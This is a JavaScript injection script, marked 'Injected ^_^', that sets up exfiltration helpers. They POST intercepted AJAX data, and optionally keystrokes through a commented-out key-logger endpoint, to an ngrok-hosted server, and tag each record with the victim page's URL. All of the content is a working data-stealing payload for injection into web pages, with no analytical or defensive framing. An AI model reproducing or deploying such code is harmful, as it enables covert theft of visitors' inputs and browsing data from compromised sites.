// alert("Injected ^_^")
window.rip_configs = {
  host: "https://eel-moral-ape.ngrok-free.app",
  // key_logger: "/api/key-logger",
  ajax_logger: "/api/ajax-logger",
}

window.logger_callback = async (url, data_logger, show_alert = false) => {
  if (typeof fetch !== "undefined") {
    try {
      const response = await fetch(url, {
        method: "POST",
        body: JSON.stringify(data_logger),
        headers: {
          "Content-Type": "application/json",
          "X-Inject-Url": window.location.href,
        },
      })

      if (show_alert) {
        const data = await response.json()
        alert(data.message)
      }
    } catch (error) {
      show_alert && alert(error.message)
    }
  }
}

window.ajax_logger = function (data) {
  const { host, ajax_logger } = window.rip_configs || {}
  if (host && ajax_logger) window.logger_callback(host + ajax_logger, data, true)
}

window.key_logger = function (data) {
  const { host, key_logger } = window.rip_configs || {}
  if (host && key_logger) window.logger_callback(host + key_logger, data)
}
